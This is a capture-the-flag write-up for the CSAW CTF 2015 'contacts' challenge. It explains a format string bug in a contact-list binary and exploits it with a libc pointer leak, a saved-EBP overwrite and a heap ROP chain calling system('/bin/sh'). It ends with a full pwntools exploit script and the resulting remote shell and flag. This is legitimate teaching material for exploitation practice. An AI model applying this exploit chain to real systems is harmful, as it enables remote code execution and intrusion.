# CSAWCTF 2015: contacts

----------
## Challenge details
| Contest        | Challenge     | Category  | Points |
|:---------------|:--------------|:----------|-------:|
| CSAWCTF 2015 | contacts | Pwn |    250 |

**Description:**
>*nc 54.165.223.128 2555*
>
>*[contacts_54f3188f64e548565bc1b87d7aa07427](challenge/contacts)*

----------
## Write-up

We are given a 32-bit ELF binary which, when run, allows us to create, remove, edit and display entries in a contact list:

```bash
$ ./contacts 
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 
```

Let's take a look at the security features of the binary:

```bash
$ ./checksec.sh --file contacts 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   contacts
```

We load it up in IDA and do some reverse-engineering to get an idea of its functionality. The vulnerability is located in the contact entry display function at 0x08048BD1 (renamed *show_contacts* by us):

```c
int __cdecl show_contact(int name, int len, int phone, char *description)
{
  printf("\tName: %s\n", name);
  printf("\tLength %u\n", len);
  printf("\tPhone #: %s\n", phone);
  printf("\tDescription: ");
  return printf(description);
}
```

The final *printf* call uses user-controlled data as its format parameter leading to a format string vulnerability. We can see we have control over the contents of description:

```c
int __cdecl display_contacts(int contacts)
{
  int result; // eax@2
  int contact_ptr; // [sp+18h] [bp-10h]@1
  signed int v3; // [sp+1Ch] [bp-Ch]@3

  contact_ptr = contacts;
  (...)
        result = show_contact(
                   contact_ptr + 8,
                   *(_DWORD *)(contact_ptr + 72),
                   *(_DWORD *)(contact_ptr + 4),
                   *(char **)contact_ptr);
  (...)
}

int main_routine()
{
  int v1; // [sp+18h] [bp-8h]@5
  signed int i; // [sp+1Ch] [bp-4h]@1

  setvbuf(stdout, 0, 2, 0);
  for ( i = 0; i <= 9; ++i )
    memset((void *)(80 * i + 0x804B0A0), 0, 0x50u);
LABEL_11:
  while ( v1 != 5 )
  {
    printf("%s", menu);
    __isoc99_scanf("%u%*c", &v1);
    switch ( v1 )
    {
        case 1:
          create_contact((int)&contact_list);
          break;
        case 2:
          remove_contact((int)&contact_list);
          break;
        case 3:
          edit_contact((int)&contact_list);
          break;
        case 4:
        display_contacts((int)&contact_list);
        break;
      default:
        puts("Invalid option");
        break;
      case 5:
        goto LABEL_11;
    }
  }
  puts("Thanks for trying out the demo, sadly your contacts are now erased");
  return 0;
}
```

Where contact_list is a variable located at 0x0804B0A0 in the .bss segment.
As we can see in the function that adds a description to a contact (called by *create_contact*) the contact description is located on the heap:

```c
char *__cdecl description(int a1)
{
  char *result; // eax@3
  int v2; // [sp+1Ch] [bp-Ch]@1

  printf("\tLength of description: ");
  __isoc99_scanf("%u%*c", &v2);
  *(_DWORD *)(a1 + 72) = v2;
  *(_DWORD *)a1 = malloc(v2 + 1);
  if ( !*(_DWORD *)a1 )
    exit(1);
  printf("\tEnter description:\n\t\t");
  fgets(*(char **)a1, v2 + 1, stdin);
  result = *(char **)a1;
  if ( !*(_DWORD *)a1 )
    exit(1);
  return result;
}
```

## The Infoleak

Given that this is an arbitrary-control format string vulnerability we can use it for both infoleaking and exploitation purposes. Loading the binary in gdb, getting the base address of libc (which will be ASLR-randomized) and subsequently comparing the information leaked by the infoleak shows us that we can (using direct format string parameter access) leak a pointer to our own description string on the heap as well as a return-address pointer into libc.

```bash
gdb ./contacts
(gdb) b *0x080485c0
(gdb) r
Breakpoint 1, 0x080485c0 in ?? ()
(gdb) info sharedlibrary
From        To          Syms Read   Shared Object Library
0xb7fde820  0xb7ff6baf  Yes (*)     /lib/ld-linux.so.2
0xb7e3ef10  0xb7f7444c  Yes (*)     /lib/i386-linux-gnu/libc.so.6
(*): Shared library is missing debugging information.
(gdb) c
Continuing.
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 1
Contact info: 
  Name: infoleak
[DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
  Enter Phone No: 1337
  Length of description: 900
  Enter description:
    %11$x.%31$x
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 4
Contacts:
  Name: infoleak
  Length 900
  Phone #: 1337
  Description: 804c018.b7e414d3
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 
(gdb) x/s 0x804c018
0x804c018:   "%11$x.%31$x\n"
(gdb) disas 0xb7e414d3,+10
Dump of assembler code from 0xb7e414d3 to 0xb7e414dd:
   0xb7e414d3 <__libc_start_main+243>:  mov    %eax,(%esp)
   0xb7e414d6 <__libc_start_main+246>:  call   0xb7e5afb0 <exit>
   0xb7e414db <__libc_start_main+251>:  xor    %ecx,%ecx
```

This infoleak is important because since we are dealing with both NX and ASLR protections we will need to construct a ROP chain and bypass ASLR.
The ingredients for our ROP chain are as follows:

* address of *system()* in libc
* address of a "/bin/sh" string
* a bogus return address (0xBADC0DE) for the ROP-call of *system()*

If we can hijack EIP control so that it ends up pointing to system() while the stack pointer points to our ROP chain (composed of a bogus return address and the address of "/bin/sh") then we can pop a shell on the target machine.

But let's first try to find out what remote libc version is used. We will have to make some assumptions but it helps that we can leak our __libc_start_main return address point, let's leak it remotely:

```bash
$ nc 54.165.223.128 2555
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 1
Contact info: 
  Name: infoleak
[DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
  Enter Phone No: 1337
  Length of description: 100
  Enter description:
    %31$x
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 4
Contacts:
  Name: infoleak
  Length 100
  Phone #: 1337
  Description: f763ca63
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 
```

Using [Niklas Baumstark's libc-database](https://github.com/niklasb/libc-database) tool we get a list of candidate libc versions based on the leaked pointer:

```bash
$ ./find __libc_start_main_ret a63
ubuntu-trusty-amd64-libc6-i386 (id libc6-i386_2.19-0ubuntu6.6_amd64)
archive-eglibc (id libc6-i386_2.19-0ubuntu6_amd64)
ubuntu-utopic-amd64-libc6-i386 (id libc6-i386_2.19-10ubuntu2.3_amd64)
archive-glibc (id libc6-i386_2.19-10ubuntu2_amd64)
archive-glibc (id libc6-i386_2.19-15ubuntu2_amd64)
$ ./dump libc6-i386_2.19-0ubuntu6.6_amd64
offset___libc_start_main_ret = 0x19a63
offset_system = 0x0003fcd0
offset_dup2 = 0x000d9dd0
offset_read = 0x000d9490
offset_write = 0x000d9510
offset_str_bin_sh = 0x15da84
```

We simply settle for the first candidate libc version and if this proves to be incorrect we can try the others (hoping the libc version is among them). This gives us offsets:

```
offset___libc_start_main_ret = 0x19a63
offset_system = 0x0003fcd0
offset_str_bin_sh = 0x15da84
```

Which we can use to construct our ROP chain later on.

## Achieving EIP control

So let's first try to achieve EIP control. Given that it's a format string vulnerability we can use it as a write-anything-somewhere primitive where we can write a arbitrary 2-byte or 4-byte sequences to address positioned on the stack. This scenario is a little different from the usual one though since our format-string is not on the stack (but in the .bss segment) and as such we cannot use our own string to specify an arbitrary address to write to so we're stuck with what we have available to us on the stack.

Using the format string as infoleak we can see an interesting target address however:

```bash
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 1
Contact info: 
  Name: test
[DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
  Enter Phone No: 1337
  Length of description: 100
  Enter description:
    %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 4
Contacts:
  Name: test
  Length 100
  Phone #: 1337
  Description: 804c008.b7e74ff1.b7fcdff4.0.0.bffff488.8048c99.804b0a8.64.804c008.804c018.
```

Here we can see the 6th DWORD on the stack precedes address 0x8048c99. Given that 0x8048c99 is the return address for the *show_contact* function back into the *display_contacts* function this indicates 0xbffff488 is the saved frame pointer of that function. If we write to that address we will overwrite the saved frame pointer of the stack frame preceding it (which corresponds to the main routine) and upon returning from that routine the following function epilogue will be executed:

```asm
leave
retn
```

Which is equivalent to:

```asm
mov esp, (old_ebp+4)
pop eip
```

So if we overwrite the saved framepointer located at 0xbffff488 with a value (minus 4) we have arbitrary control over EIP and we also have control over ESP. We can use this to make EIP point to the first DWORD in our ROP chain (ie. the address of *system*) and have ESP point to the second DWORD in the ROP chain (due to retn being the equivalent of a pop eip).

Given that we cannot control the actual stack we have to position our ROP chain somewhere where we can make it (and the surrounding memory area) act like a 'fake stack', including having enough 'scratch space' for the instructions and function calls in our ROP chain to work with without reading from or writing to invalid memory addresses. Luckily our contact description is allocated on the heap and we have control over the (arbitrary) allocation size. So allocating a heap buffer of 8192 bytes and placing our ROP chain there will allow it to act like a 'fake stack'.

Hence using the %Ax%Bx%6$n template (where A and B are numbers dependent on our ROP chain address) we can exploit this vulnerability.

## Wrapping it all up

All that's left is using the infoleak a second time during ROP chain positioning to disclose a pointer to its heap buffer which we will then use as the target address to overwrite the saved frame pointer at 0xbffff488 with our ROP chain address.

In summary the approach is:

* Create a contact with a description exploiting the fms vulnerability to leak a pointer into libc
* Determine the addresses of our ROP chain elements
* Create a second contact with a description that starts with our ROP chain and ends with an fms pointer leak to get the address of our ROP chain
* Create a third contact entry with a description using the fms vulnerability to overwite the saved frame pointer with the address of our ROP chain (minus 4)
* Trigger the exploit by making the main routine return (and thus set EIP=system, ESP=(@ROP + 4))

Which the [following exploit](solution/contacts_exploit.py) achieves:

```python
#!/usr/bin/env python
#
# CSAWCTF 2015
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#

import re
from pwn import *
from struct import pack
from math import floor

def do_infoleak(h, pointer_offset): 
  name = "infoleak"
  phone = "1337"
  desc_len = "8192"
  desc = "%31$x"

  # Create new contact
  h.sendline("1")

  msg = h.recvuntil('Name: ')
  print msg

  h.sendline(name)

  msg = h.recvuntil('Enter Phone No: ')
  print msg

  h.sendline(phone)

  msg = h.recvuntil('Length of description: ')
  print msg

  h.sendline(desc_len)

  msg = h.recv(1024)
  print msg

  h.sendline(desc)

  msg = h.recvuntil('>>> ')
  print msg

  # Display contacts
  h.sendline("4")

  msg = h.recvuntil('>>> ')
  print msg

  # Extract leaked pointers
  libc_ptr = re.findall('.*Description:\s(.*?)\n.*', msg)[0]
  return (int(libc_ptr, 16) - pointer_offset)

def set_ropchain(h, system_addr, binsh_addr): 
  name = "ropchain"
  phone = "1337"
  # Need enough space on heap since it's going to be treated as stack during ROP sploiting
  desc_len = "8192"

  # junk return address for system
  junk = 0x0BADC0DE

  # ROP chain: [@system (4 bytes)][junk (4 bytes)][@"/bin/sh" (4 bytes)]
  ROP_chain = [system_addr,
         junk,
               binsh_addr]
  # Include FMS infoleak to get address of ROP chain
  desc = "".join([pack('<I', x) for x in ROP_chain]) + "<%11$x>"

  # Create new contact
  h.sendline("1")

  msg = h.recvuntil('Name: ')
  print msg

  h.sendline(name)

  msg = h.recvuntil('Enter Phone No: ')
  print msg

  h.sendline(phone)

  msg = h.recvuntil('Length of description: ')
  print msg

  h.sendline(desc_len)

  msg = h.recv(1024)
  print msg

  h.sendline(desc)

  msg = h.recvuntil('>>> ')
  print msg

  # Display contacts
  h.sendline("4")

  msg = h.recvuntil('>>> ')
  print msg

  return int(re.findall('.*Description:.*?\<(.*?)\>.*\n.*', msg)[0], 16)

def do_exploit(h, ropchain_addr):
  name = "sploit"
  phone = "1"
  desc_len = "900"

  new_ebp = (ropchain_addr - 4)

  part_1 = floor(new_ebp / 2)
  part_2 = part_1 + (new_ebp - (part_1 * 2))

  # Format string exploit: overwrite saved EBP with (ropchain_addr - 4)
  desc_buffer = "%"+str(part_1)+"x%"+str(part_2)+"x%6$n"

  print "[*]Sending exploit..."

  # Create new contact
  h.sendline("1")

  msg = h.recvuntil('Name: ')
  print msg

  h.sendline(name)

  msg = h.recvuntil('Enter Phone No: ')
  print msg

  h.sendline(phone)

  msg = h.recvuntil('Length of description: ')
  print msg

  h.sendline(desc_len)

  msg = h.recv(1024)
  print msg

  h.sendline(desc_buffer)

  msg = h.recvuntil('>>> ')
  print msg

  print "[+]Exploit sent!"

  # Trigger exploit
  print "[*]Triggering format string vulnerability..."

  # Display contacts
  h.sendline("4")

  # Receive printed output until we are back at menu
  msg = h.recvuntil('>>> ')

  print "[*]Triggering RCE condition..."
  # Exit
  h.sendline("5")

  # Waiting for the shell to pop!
  h.interactive()

  return

host = '54.165.223.128'
port = 2555

offset_libc_start_main_ret = 0x19a63
offset_system = 0x0003fcd0
offset_str_bin_sh = 0x15da84

h = remote(host, port, timeout = None)

msg = h.recvuntil('>>> ')

print msg

# Use infoleak
libc_base = do_infoleak(h, offset_libc_start_main_ret)
system_addr = (libc_base + offset_system)
binsh_addr = (libc_base + offset_str_bin_sh)

print "[+]Got leaked libc base address: [0x%x]" % libc_base
print "[+]Got '/bin/sh' address: [0x%x]" % binsh_addr
print "[+]Got system() address: [0x%x]" % system_addr

# Build ROP chain
ropchain_addr = set_ropchain(h, system_addr, binsh_addr)

print "[+]Got ROP chain address: [0x%x]" % ropchain_addr

do_exploit(h, ropchain_addr)

h.close()
```

Executing the exploit will pop a shell:

```bash
$ ./contacts_exploit.py 
[+] Opening connection to 54.165.223.128 on port 2555: Done
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 
Contact info: 
    Name: 
[DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
    Enter Phone No: 
    Length of description: 
    Enter description:
        
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 
Contacts:
    Name: infoleak
    Length 8192
    Phone #: 1337
    Description: f7547a63
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 
[+]Got leaked libc base address: [0xf752e000]
[+]Got '/bin/sh' address: [0xf768ba84]
[+]Got system() address: [0xf756dcd0]
Contact info: 
    Name: 
[DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
    Enter Phone No: 
    Length of description: 
    Enter description:
        
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 
Contacts:
    Name: infoleak
    Length 8192
    Phone #: 1337
    Description: f7547a63
    Name: ropchain
    Length 8192
    Phone #: 1337
    Description: ÐÜV÷ÞÀ­\x0b\x84\xbah÷<87fe030>
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 
[+]Got ROP chain address: [0x87fe030]
[*]Sending exploit...
Contact info: 
    Name: 
[DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
    Enter Phone No: 
    Length of description: 
    Enter description:
        
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 
[+]Exploit sent!
[*]Triggering format string vulnerability...
[*]Triggering RCE condition...
[*] Switching to interactive mode
Thanks for trying out the demo, sadly your contacts are now erased
$ whoami
ctf
$ id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
$ uname -a
Linux ip-172-31-44-100 3.13.0-48-generic #80-Ubuntu SMP Thu Mar 12 11:16:15 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
$ ls -la
total 44
drwxr-xr-x 2 ctf  ctf  4096 Sep 18 19:39 .
drwxr-xr-x 4 root root 4096 Sep 18 01:00 ..
-rw------- 1 ctf  ctf  1340 Sep 20 15:45 .bash_history
-rw-r--r-- 1 ctf  ctf   220 Sep 18 01:00 .bash_logout
-rw-r--r-- 1 ctf  ctf  3637 Sep 18 01:00 .bashrc
-rwxrwxr-x 1 ctf  ctf  9716 Sep 18 19:38 contacts_54f3188f64e548565bc1b87d7aa07427
-rw-rw-r-- 1 ctf  ctf    35 Sep 18 19:21 flag
-rw-r--r-- 1 ctf  ctf   675 Sep 18 01:00 .profile
-rw-rw-r-- 1 ctf  ctf    66 Sep 18 01:02 .selected_editor
$ cat flag
flag{f0rm47_s7r1ng5_4r3_fun_57uff}
```